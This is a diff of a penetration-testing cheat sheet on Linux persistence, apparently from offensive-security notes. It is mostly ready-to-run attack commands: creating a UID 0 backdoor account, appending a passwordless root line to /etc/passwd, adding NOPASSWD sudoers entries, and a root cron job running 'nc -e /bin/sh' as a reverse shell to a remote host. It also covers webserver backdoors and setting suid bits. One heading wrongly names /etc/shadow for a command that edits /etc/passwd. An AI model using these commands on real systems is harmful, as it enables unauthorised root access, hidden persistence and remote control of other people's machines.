@@ -1,4 +1,4 @@
-# Persistence on Linux
+# Persistence on Linux
 
 ## Create a new user
 
@@ -6,31 +6,30 @@
 adduser pelle
 adduser pelle sudo
 ```
-
-Or:
 ```
 useradd -u0 -g0 -o -s /bin/bash -p `openssl passwd yourpass` rootuser
 ```
 
-On older machine:
+* On older machine
 ```
 useradd pelle
 passwd pelle
 echo "pelle    ALL=(ALL) ALL" >> /etc/sudoers
 ```
 
-Or directly edit `/etc/passwd`:
+* Directly edit `/etc/shadow`:
 ```
 echo 'spotless::0:0:root:/root:/bin/bash' >> /etc/passwd
 ```
+You can create your own password: `mkpasswd -m SHA-512 mypassword`
 
-## Give root rights
+## Give root rights
 
 ```
 echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
 ```
 
-## Crack the password of existing user
+## Crack the password of existing user
 
 Get the `/etc/shadow`
 
@@ -43,7 +42,7 @@ chmod 600 .ssh/authorized_keys
 ssh -i nameOfMyKey kim@192.168.1.103
 ```
 
-## Cronjob
+## Cron job
 
 * Check if cronjob is active
 ```
@@ -61,10 +60,10 @@ service crond status
 ```
 crontab -e
 /10 * * * * nc -e /bin/sh 192.168.1.21 5556
-/10 * * * * pelle nc -e /bin/sh 192.168.1.21 5556
+/10 * * * * root nc -e /bin/sh 192.168.1.21 5556
 ```
 
-## Backdoor in webserver
+## Backdoor in webserver
 
 Put backdoor on webserver, either in separate file or in hidden in another file.
 
@@ -80,6 +79,7 @@ chown root myBinary
 
 # set the sticky bit/suid
 chmod u+s myBinary
+chmod g+s myBinary
 ```
 
 # Persistence on Windows
